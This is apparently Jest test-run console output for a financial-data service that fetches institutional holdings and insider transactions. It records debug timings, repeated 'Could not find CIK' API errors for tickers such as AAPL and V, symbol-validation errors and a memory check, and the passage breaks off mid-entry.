    [2025-09-21T23:25:26.746Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalIntelligence completed in 280ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalIntelligence",
      "duration": 280,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    ✓ Generated institutional intelligence for NVDA:

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:374:17)

  console.log
      Composite Score: 5/10

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:375:17)

  console.log
      Weighted Sentiment: NEUTRAL

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:376:17)

  console.log
      Key Insights: 0

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:377:17)

  console.log
      Risk Factors: 0

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:378:17)

  console.log
      Opportunities: 0

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:379:17)

  console.log
      Data Quality: 0.0%

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:380:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Invalid symbol format - must be 1-5 uppercase letters/numbers, Symbol too long, Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Invalid symbol format - must be 1-5 uppercase letters/numbers, Symbol too long, Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.log
    [2025-09-21T23:25:26.875Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalIntelligence
    Metadata: {
      "timeout": 45000,
      "retries": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:26.876Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:26.878Z] DEBUG [InstitutionalDataService] Starting API call: getInsiderTransactions
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:26.922Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol JPM
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "JPM",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 0)
      at InstitutionalDataService.executeGetInstitutionalIntelligence (app/services/financial-data/InstitutionalDataService.ts:283:40)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:399:28)

  console.log
    [2025-09-21T23:25:26.923Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 47ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 47,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 0)

  console.error
    [2025-09-21T23:25:27.167Z] ERROR [InstitutionalDataService] API Error: GET insider_transactions - Could not find CIK for symbol JPM
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "insider_transactions",
      "error": {},
      "symbol": "JPM",
      "days": 180
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInsiderTransactions (app/services/financial-data/InstitutionalDataService.ts:267:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 1)
      at InstitutionalDataService.executeGetInstitutionalIntelligence (app/services/financial-data/InstitutionalDataService.ts:283:40)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:399:28)

  console.log
    [2025-09-21T23:25:27.169Z] DEBUG [InstitutionalDataService] Performance: getInsiderTransactions completed in 291ms
    Metadata: {
      "type": "performance",
      "operation": "getInsiderTransactions",
      "duration": 291,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 1)

  console.log
    [2025-09-21T23:25:27.169Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalIntelligence completed in 294ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalIntelligence",
      "duration": 294,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:27.253Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:27.257Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol AAPL
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "AAPL",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:422:22)

  console.log
    [2025-09-21T23:25:27.258Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 5ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 5,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:27.317Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:27.317Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:27.318Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:27.318Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:27.318Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:27.394Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol V
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "V",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 0)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:435:23)

  console.log
    [2025-09-21T23:25:27.395Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 78ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 78,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 0)

  console.error
    [2025-09-21T23:25:27.541Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol V
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "V",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 1)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:435:23)

  console.log
    [2025-09-21T23:25:27.542Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 225ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 225,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 1)

  console.error
    [2025-09-21T23:25:27.718Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol V
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "V",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 2)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:435:23)

  console.log
    [2025-09-21T23:25:27.719Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 401ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 401,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 2)

  console.error
    [2025-09-21T23:25:27.960Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol V
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "V",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 3)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:435:23)

  console.log
    [2025-09-21T23:25:27.963Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 645ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 645,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 3)

  console.error
    [2025-09-21T23:25:28.107Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol V
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "V",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 4)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:435:23)

  console.log
    [2025-09-21T23:25:28.108Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 790ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 790,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 4)

  console.log
    [2025-09-21T23:25:28.176Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:28.180Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 4ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 4,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:28.239Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:28.332Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol AAPL
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "AAPL",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:480:7)

  console.log
    [2025-09-21T23:25:28.333Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 94ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 94,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Invalid symbol format - must be 1-5 uppercase letters/numbers, Symbol too long, Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Invalid symbol format - must be 1-5 uppercase letters/numbers, Symbol too long, Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.log
    [2025-09-21T23:25:28.334Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:28.515Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol AAPL
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "AAPL",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:486:28)

  console.log
    [2025-09-21T23:25:28.516Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 182ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 182,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:28.593Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:28.595Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:28.595Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:28.596Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:28.596Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:28.759Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol AAPL
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "AAPL",
      "quarters": 1
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 0)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:499:23)

  console.log
    [2025-09-21T23:25:28.760Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 167ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 167,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 0)

  console.error
    [2025-09-21T23:25:28.921Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol MSFT
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "MSFT",
      "quarters": 1
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 1)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:499:23)

  console.log
    [2025-09-21T23:25:28.922Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 327ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 327,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 1)

  console.error
    [2025-09-21T23:25:29.074Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol GOOGL
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "GOOGL",
      "quarters": 1
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 2)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:499:23)

  console.log
    [2025-09-21T23:25:29.075Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 480ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 480,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 2)

  console.error
    [2025-09-21T23:25:29.228Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol AMZN
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "AMZN",
      "quarters": 1
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 3)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:499:23)

  console.log
    [2025-09-21T23:25:29.228Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 632ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 632,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 3)

  console.error
    [2025-09-21T23:25:29.371Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol TSLA
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "TSLA",
      "quarters": 1
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 4)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:499:23)

  console.log
    [2025-09-21T23:25:29.372Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 776ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 776,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 4)

  console.log
    ✓ Memory usage increased by -0.73MB for 5 symbols

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.test.ts:518:15)

  console.log
    [2025-09-21T23:25:29.487Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

